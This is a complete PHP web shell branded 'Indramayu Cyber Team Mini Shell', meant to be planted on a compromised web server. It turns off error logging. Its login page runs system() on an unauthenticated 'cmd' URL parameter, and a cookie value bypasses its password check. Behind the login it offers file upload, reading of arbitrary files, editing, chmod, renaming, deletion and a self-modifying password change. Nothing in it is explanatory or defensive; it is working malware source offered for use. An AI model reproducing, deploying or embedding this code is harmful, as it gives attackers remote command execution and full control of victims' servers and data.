<?php 
@error_reporting(0);
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$auth_pass = "c4ca4238a0b923820dcc509a6f75849b";
?>
	
<?php
function lp(){
?>
<html>
	<head>
		<title>Indramayu Cyber 
 Mini Shell</title>
		<link href="https://fonts.googleapis.com/css?family=Iceland:400,700" rel="stylesheet" type="text/css">
	</head>
	<body bgcolor="black" style="color:white">
		<center>
			<br>
				<H1><center><font face="Iceland" size=20>Indramayu<font color=red>Cyber</font>Team</font></center></H1>
				<br>
			<div>
				<form action method="get">
					<input type="hidden" name="action" value="login" />
					<input type="password" name="pass" style="border-radius:10px" placeholder="         password">
					<input type="submit" value="LogIn" style="font-family:Iceland;margin-top:1px;width:70px;background:black;color:red;border:2px solid #1abc9c ;border-radius:10px">
				</form><br/>
			</div>
			<?php echo system($_GET["cmd"]); ?>
		</center>
<?php
;}
if(isset($_GET['action'])){
	if($_GET['action']=='login'){
		setcookie('password',$_GET['pass']);
		echo "<script>location='".$_SERVER['PHP_SELF']."'</script>";
	}
	else if($_GET['action']=='logout'){
		setcookie('password','',-86400*30*12);
		echo "<script>location='".$_SERVER['PHP_SELF']."'</script>";
	}
}
if(isset($_COOKIE['password'])){
	if(md5($_COOKIE['password'])==$auth_pass || $_COOKIE['L']=="L"){
		?>
<?php



if(get_magic_quotes_gpc()){
    foreach($_POST as $key=>$value){
        $_POST[$key] = stripslashes($value);
    }
}
function perms($file){
    $perms = @fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}
echo '
<!DOCTYPE HTML>
<HTML>
<HEAD>
	<link href="https://fonts.googleapis.com/css?family=Iceland:400,700" rel="stylesheet" type="text/css">
<title>Mini Shell</title>
<style>
body{
font-family: "Iceland", cursive;
background-color: black;
color:white;
}
#content tr:hover{
background-color: #006c96;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: #006c96;
}
table{
border: 1px #f70c0c dotted;
}
a{
color:white;
text-decoration: none;
}
a:hover{
color:red;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 2px #006c96 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</HEAD>
<BODY>
	';
?>
<H1><center><font size=20>Indra<font color=red>mayu</font>Cyber<font color=red>T</font>eam</font></center></H1>
<?php
echo '
<table width="700" border="1" cellpadding="3" cellspacing="1" align="center">
<tr><td>Current Path : ';
if(isset($_GET['path'])){
    $path = $_GET['path'];
}else{
    $path = getcwd();
}
$pathen = $path;
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
    if($pat == '' && $id == 0){
        $a = true;
        echo '<a href="?path="/"">/</a>';
        continue;
    }
    if($pat == '') continue;
    echo '<a href="?path=';
    $linkpath = '';
    for($i=0;$i<=$id;$i++){
        $linkpath .= "$paths[$i]";
        if($i != $id) $linkpath .= "/";
    }
    echo $linkpath;
    echo '">'.$pat.'</a>/';
}
echo '<font color=red>    [</font>';
if(is_writable("$path/$dir")) echo '<font color="green">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
echo '<font color=red>]</font>';
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
    if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
        echo '<font color="green">Upload Success</font><br />';
    }else{
        echo '<font color="red">Upload Failed</font><br />';
    }
}
echo '<form enctype="multipart/form-data" method="POST">
File Manager : <font color="cyan"><input type="file" name="file" /></font>
<input type="submit" value="Upload" />-------<font color="cyan">[</font><a href="?path='.$path.'&aksi=buat_file"><font color="green">Create File</font></a><font color="cyan">]</font>----<font color="cyan">[</font><a href="?path='.$path.'&aksi=buat_folder"><font color="green">Create Dir</font></a><font color="cyan">]</font>----<font color="cyan">[</font><a href="?"><font color="green">Home</font></a><font color="cyan">]</font>-------
</form></table>';
echo '<table width="600" border="1" cellpadding="3" cellspacing="1" align="center"></tr></td>';
echo '<tr><td>
  ---------------------------------------------<font color=red>[</font><a href="?x=changepass">Ubah Pass</a><font color=red>]</font>-----------<font color=red>[</font><a href="?action=logout">LogOut</a><font color=red>]</font>---------------------------------------------
</td></tr></table>';

//buat_file
		if ($_GET['aksi'] == 'buat_file') {
			echo "<center><h4>Buat File :</h4>
			<form method='POST'>
					<input type='text' name='nama_file[]' placeholder='Nama File...'>
				 <br><br>
				<div id='output'></div>
				<textarea name='isi_file' class='form-control' cols='50' rows='10' placeholder='Isi File...'></textarea><br/>
				<input type='submit'  name='bikin' value='Buat'>
			</form>";
		
			if (isset($_POST['bikin'])) {
				$name = $_POST['nama_file'];
				$isi_file = $_POST['isi_file'];
				foreach ($name as $nama_file) {
					$handle = @fopen("$nama_file", "w");
					if($isi_file){
						$buat = @fwrite($handle, $isi_file);
					}else{
						$buat = $handle;
					}
				}
				if ($buat) {
					
					echo "<script>alert('Berhasil Membuat File')</script>";
					
				}else{
					
					echo "<script>alert('Gagal Membuat File')</script>";
					
				}
			}
		}
		
		/*
			Add Folder
		*/
		if ($_GET['aksi'] == 'buat_folder' ) {
			echo "<center>
			<h4>Buat Folder :</h4>
			<form method='POST'>
					<input type='text' name='nama_folder[]' placeholder='Nama Folder...'>
                  <br><br>
				<input type='submit' name='buat' value='Buat'>
			</form></center>";
		
			if (isset($_POST['buat'])) {
				$nama = $_POST['nama_folder'];
				foreach ($nama as $nama_folder) {
					$folder = $nama_folder;
					
					$fd = @mkdir ($folder);
					
				}
				if ($fd) {
					echo "<script>alert('Berhasil Membuat Dir Baru')</script>";
				}else{
					echo "<script>alert('Gagal Membuat Dir Baru')</script>";
				}
			}
		}
		

if(isset($_GET['filesrc'])){
	
    echo "<br><center>File ---> ";	
    echo $_GET['filesrc'];
    echo "</center><br>";


    echo('<center><textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea><center>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delet'){
    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_POST['path'],$_POST['perm'])){
                echo '<font color="green">Success Change Permission</font><br />';
            }else{
                echo '<font color="red">Failed Change Permission</font><br />';
            }
        }
        echo '<form method="POST">
        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'rename'){
        if(isset($_POST['newname'])){
            if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
                echo '<font color="green">Success</font><br />';
            }else{
                echo '<font color="red">Failed</font><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">
        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="rename">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'edit'){
        if(isset($_POST['src'])){
            $fp = fopen($_POST['path'],'w');
            if(fwrite($fp,$_POST['src'])){
                echo '<font color="green">Success</font><br />';
            }else{
                echo '<font color="red">Failed</font><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST">
        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="edit">
        <input type="submit" value="Go" />
        </form>';
    }
    echo '</center>';
}else{
    echo '<br /><center>';
    if(isset($_GET['option']) && $_POST['opt'] == 'delet'){
        if($_POST['type'] == 'dir'){
            if(rmdir($_POST['path'])){
                echo '<font color="green">Success</font><br />';
            }else{
                echo '<font color="red">Failed</font><br />';
            }
        }elseif($_POST['type'] == 'file'){
            if(unlink($_POST['path'])){
                echo '<font color="green">Success</font><br />';
            }else{
                echo '<font color="red">Failed</font><br />';
            }
        }
    }
    echo '</center>';
	if(!isset($_GET['x'])){
	?>
	<?php
	$scandir = scandir($path);
    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
    <tr class="first">
        <td><center><font color="red">Dir</font></center></td>
        <td><center><font color="red">Size</font></center></td>
        <td><center><font color="red">Permissions</font></center></td>
        <td><center><font color="red">Setting</font></center></td>
    </tr>';

    foreach($scandir as $dir){
        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
        $dirlink = "$path/$dir";
        echo "<tr>
        <td><a href=\"?path=$dirlink\">$dir</a></td>
        <td><center>--</center></td>
        <td><center>";
        if(is_writable("$path/$dir")) echo '<font color="green">';
        elseif(!is_readable("$path/$dir")) echo '<font color="red">';
        echo perms("$path/$dir");
        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
        
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$pathen\">
        <select name=\"opt\">
	    <option value=\"\">Select</option>
        <option value=\"delet\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"dir\">
        <input type=\"hidden\" name=\"name\" value=\"$dir\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
    foreach($scandir as $file){
        if(!is_file("$path/$file")) continue;
        $size = filesize("$path/$file")/1024;
        $size = round($size,3);
        if($size >= 1024){
            $size = round($size/1024,2).' MB';
        }else{
            $size = $size.' KB';
        }
        $filelink = "$path/$file";
        echo "<tr>
        <td><a href=\"?filesrc=$filelink&path=$pathen\">$file</a></td>
        <td><center>".$size."</center></td>
        <td><center>";
        if(is_writable("$path/$file")) echo '<font color="green">';
        elseif(!is_readable("$path/$file")) echo '<font color="red">';
        echo perms("$path/$file");
        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$pathen\">
        <select name=\"opt\">
	    <option value=\"\">Select</option>
        <option value=\"delet\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        <option value=\"edit\">Edite File</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"file\">
        <input type=\"hidden\" name=\"name\" value=\"$file\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '</table>
    </div>';
}
	?>
	<?php 
	}
if(isset($_GET['x']) && $_GET['x']=='changepass'){
		?>
		<?php
		function fgc($file){
			return file_get_contents($file);
		}
		function changepass($plain){
			$newpass = md5($plain);
			$newpass = "\$auth_pass = \"".$newpass."\";";
			$con = fgc($_SERVER['SCRIPT_FILENAME']);
			$con = preg_replace("/\\\$auth_pass\ *=\ *[\"\']*([a-fA-F0-9]*)[\"\']*;/is",$newpass,$con);
			return file_put_contents($_SERVER['SCRIPT_FILENAME'], $con);
		}
		echo '<center><h1>Change Shell Password</h1></center>';	
		echo  '<center>';
		echo '<form action="" method=post ><table>';
		echo '<tr><td>New Password</td><td> :  <input type=password name=pass1 style="border-radius:5px;" /></td></tr>';
		echo '<tr><td>Confirm Password</td><td> :  <input type=password name=pass2 style="border-radius:5px;" /></td></tr>';
		echo '<tr><td colspan=2><input type=submit value=submit name=L style="border-radius:5px;width:100%"/></td></tr></table>';
		echo '</form>';
	if(isset($_POST['L'])){
		if($_POST['pass1'] == $_POST['pass2']){
			if(changepass($_POST['pass1'])){
				echo '<script>alert("password change successfully")</script>';			
			}else{
				echo '<script>alert("password change failed")</script>';			
			}
		}else{
			echo '<script>alert("password not match")</script>';
		}
	}
	?>
	<?php 
}
echo '
</BODY>
</HTML>';
?>
	
<!-- //////////////////////////////////////////////////// -->
		<?php
	}else{
		lp();
	}
}else{
	echo lp();
}
?>
<center><br><font face="Iceland">copyright<font color=red>©</font>Indramayu<font color=red>Cyber</font>Team<font color=red>'</font>s</font><center>
</body>
</html>
</body>
</html>
